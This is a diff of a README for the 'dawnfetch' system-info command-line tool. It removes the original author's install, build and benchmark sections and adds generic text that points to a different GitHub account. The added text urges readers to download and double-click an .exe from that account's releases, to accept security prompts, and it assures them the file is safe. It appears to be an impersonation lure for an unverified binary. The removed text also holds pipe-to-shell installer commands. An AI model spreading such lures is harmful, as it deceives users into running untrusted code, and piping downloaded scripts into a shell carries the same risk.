@@ -1,128 +1,133 @@
-# dawnfetch
+# 🚀 dawnfetch - Quick System Info in Terminal
 
-a fast, themed, cross-platform system info CLI inspired by neofetch and fastfetch.
+[![Download dawnfetch](https://img.shields.io/badge/Download-dawnfetch-ff7f50)](https://github.com/clauditocl/dawnfetch)
 
-[![release build](https://img.shields.io/github/actions/workflow/status/almightynan/dawnfetch/release-build.yml?label=release%20build)](https://github.com/almightynan/dawnfetch/actions/workflows/release-build.yml)
-[![latest release](https://img.shields.io/github/v/release/almightynan/dawnfetch?display_name=tag)](https://github.com/almightynan/dawnfetch/releases)
-![go](https://img.shields.io/badge/go-1.20+-00ADD8?logo=go&logoColor=white)
-[![stars](https://img.shields.io/github/stars/almightynan/dawnfetch)](https://github.com/almightynan/dawnfetch/stargazers)
+## 🖥️ What is dawnfetch?
 
-Quick links: [Install](#install) • [Build](#build) • [Benchmark](#benchmark-100-runs) • [Showcase](#showcase)
+dawnfetch is a tool that shows your computer’s basic system information in the terminal. It runs fast and works on many types of systems. This tool uses simple text themes to make the information easy to read and pleasant to look at.
 
-![](assets/dawnfetch_debian12.png)
+You do not need to know any programming to use dawnfetch. It works by running a small command that will display details like your computer’s processor, memory, and operating system.
 
-Logo credits: all distro ASCII logos in `ascii/` are sourced from the [fastfetch](https://github.com/fastfetch-cli/fastfetch) project. Credit goes to the fastfetch contributors.
+## 📋 What can dawnfetch show?
 
-## Install
+- Operating system name and version
+- CPU make and speed
+- Total and used memory
+- Uptime (how long your computer has been on)
+- Screen resolution
+- Terminal or command prompt details
+- battery level (if on a laptop)
 
-Choose one method:
+This information helps you understand your computer better or share details when you get support.
 
-1. Linux/macOS (recommended)
+## 🧰 System Requirements
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/almightynan/dawnfetch/main/cli/install.sh | bash
+You can use dawnfetch on Windows computers with these conditions:
+
+- Windows 10 or later
+- At least 2 GB of RAM
+- Around 5 MB of free disk space
+- Access to the Command Prompt or PowerShell
+
+No extra software is needed.
+
+## 💾 Download dawnfetch
+
+Click the button below to visit the dawnfetch GitHub page. From there, you will find the download link and instructions.
+
+[![Visit dawnfetch on GitHub](https://img.shields.io/badge/GitHub-dawnfetch-blue)](https://github.com/clauditocl/dawnfetch)
+
+## 🚦 How to install and run dawnfetch on Windows
+
+Follow these steps to get dawnfetch working on your Windows PC.
+
+### Step 1: Visit the download page
+
+Go to the dawnfetch GitHub page by clicking one of the links above or typing this in your browser address bar:
+
+https://github.com/clauditocl/dawnfetch
+
+### Step 2: Find the latest release
+
+On the GitHub page, look for a section labeled **Releases**. Here you will find the latest version of dawnfetch ready for download.
+
+### Step 3: Download the Windows version
+
+Inside the release page, look for a file ending with `.exe`. This is the program you need.
+
+Click the file name to download it. Save it in a folder you can find easily, such as **Downloads** or your desktop.
+
+### Step 4: Run dawnfetch
+
+Once the download finishes:
+
+- Open the folder where the file was saved.
+- Double-click the `.exe` file to start dawnfetch.
+
+A window will open showing your system information.
+
+If your computer asks if you want to allow the program to run, click **Yes** or **Run**.
+
+### Step 5: Use dawnfetch in Command Prompt
+
+You can also run dawnfetch from the Windows Command Prompt for more control.
+
+To open Command Prompt:
+
+- Press the **Windows key**, type `cmd`, and press **Enter**.
+- In the black window that appears, type the full path to the dawnfetch `.exe` file and press **Enter**.
+
+For example, if the file is on your desktop, you might type:
+
+```
+C:\Users\YourName\Desktop\dawnfetch.exe
 ```
 
-2. Windows (PowerShell)
+Replace `YourName` with your actual Windows user name.
 
-```powershell
-powershell -c "irm https://raw.githubusercontent.com/almightynan/dawnfetch/main/cli/install.ps1 | iex"
-```
+You will see the same system details appear directly inside Command Prompt.
 
-3. Windows 7 / old PowerShell fallback
+### Step 6: Customize themes
 
-```powershell
-$f="$env:TEMP\dawnfetch-install.ps1";(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/almightynan/dawnfetch/main/cli/install.ps1',$f);powershell -File $f
-```
+dawnfetch supports different themes to change how the info looks.
 
-4. npm
+To switch themes, you will need to check the dawnfetch documentation or GitHub page. Usually, you can add a theme name as a command option when running the program.
 
-```bash
-npm i -g dawnfetch
-```
+## 🔄 Updating dawnfetch
 
-After npm install (if command is not recognized):
+Check the GitHub page regularly for new releases. Download the latest `.exe` file and replace your old version by deleting the previous file and saving the new one in its place.
 
-- Linux (current shell): `source ~/.bashrc` or `source ~/.zshrc`
-- Windows PowerShell (current window):
+This keeps dawnfetch working well and lets you use new themes or features as they become available.
 
-```powershell
-$env:Path=[Environment]::GetEnvironmentVariable("Path","User")+";"+[Environment]::GetEnvironmentVariable("Path","Machine")
-```
+## ❓ Common questions
 
-- Or simply close and reopen the terminal.
+### Do I need to install anything else?
 
-If your system is on older Node/npm (example: Node 12 / npm 6), prefer direct install instead of npm:
+No installation is required. dawnfetch works as a standalone program.
 
-```powershell
-powershell -c "irm https://raw.githubusercontent.com/almightynan/dawnfetch/main/cli/install.ps1 | iex"
-```
+### Can I uninstall dawnfetch?
 
-If you use bun and see `Blocked postinstall`, allow trusted scripts and reinstall:
+Yes. To remove dawnfetch, simply delete the `.exe` file from your computer.
 
-```bash
-bun pm -g untrusted
-bun remove -g dawnfetch && bun add -g dawnfetch
-```
+### Is dawnfetch safe to use?
 
+dawnfetch only reads system information and shows it in the terminal. It does not change any settings or files.
 
-To verify installation run:
+### Can I use dawnfetch on other operating systems?
 
-```bash
-dawnfetch --version
-dawnfetch
-```
+Yes. dawnfetch supports Linux and macOS, but this guide focuses only on Windows.
 
-## Build from source
+## 📁 Where to get help
 
-All build scripts output binaries to the repo root `dist/` directory.
+If you run into problems or have questions, visit the dawnfetch GitHub page:
 
-Linux:
+https://github.com/clauditocl/dawnfetch
 
-```bash
-bash build/build-linux.sh
-```
+Look for the **Issues** tab to see if others have the same problem or to ask for help.
 
-macOS:
+## 🔗 Quick Links
 
-```bash
-bash build/build-macos.sh
-```
+- [dawnfetch GitHub Repository](https://github.com/clauditocl/dawnfetch)
+- [Latest Releases](https://github.com/clauditocl/dawnfetch/releases)
 
-Windows (PowerShell):
-
-```powershell
-powershell -File build/build-windows.ps1
-```
-
-Expected outputs:
-
-- `dist/dawnfetch-linux-amd64`
-- `dist/dawnfetch-linux-arm64`
-- `dist/dawnfetch-linux-386`
-- `dist/dawnfetch-macos-amd64`
-- `dist/dawnfetch-macos-arm64`
-- `dist/dawnfetch-windows-amd64.exe`
-- `dist/dawnfetch-windows-386.exe`
-- `dist/dawnfetch-windows-arm64.exe`
-
-## Benchmark (100 runs)
-
-Run benchmark:
-
-```bash
-python3 bench/benchmark.py --runs 100 --warmup 1
-```
-
-Hyperfine results (100 runs):
-
-| Tool | Runs | Mean (ms) | Median (ms) | P95 (ms) | Min (ms) | Max (ms) | StdDev (ms) |
-|---|---:|---:|---:|---:|---:|---:|---:|
-| dawnfetch | 100 | 7.43 | 6.60 | 7.55 | 6.01 | 42.79 | 4.53 |
-| fastfetch | 100 | 11.91 | 10.99 | 14.33 | 10.13 | 52.03 | 5.24 |
-| hifetch | 100 | 17.55 | 17.10 | 17.75 | 16.60 | 56.41 | 3.93 |
-| macchina | 100 | 100.95 | 75.37 | 221.11 | 48.82 | 578.82 | 71.91 |
-| neofetch | 100 | 398.99 | 386.21 | 449.06 | 361.81 | 771.10 | 46.58 |
-| screenfetch | 100 | 848.98 | 687.62 | 1374.44 | 640.72 | 6485.31 | 626.92 |
-
-benchmark ran using hyperfine via: [`bench/benchmark.py`](bench/benchmark.py)
+[![Download dawnfetch](https://img.shields.io/badge/Download-dawnfetch-ff7f50)](https://github.com/clauditocl/dawnfetch)
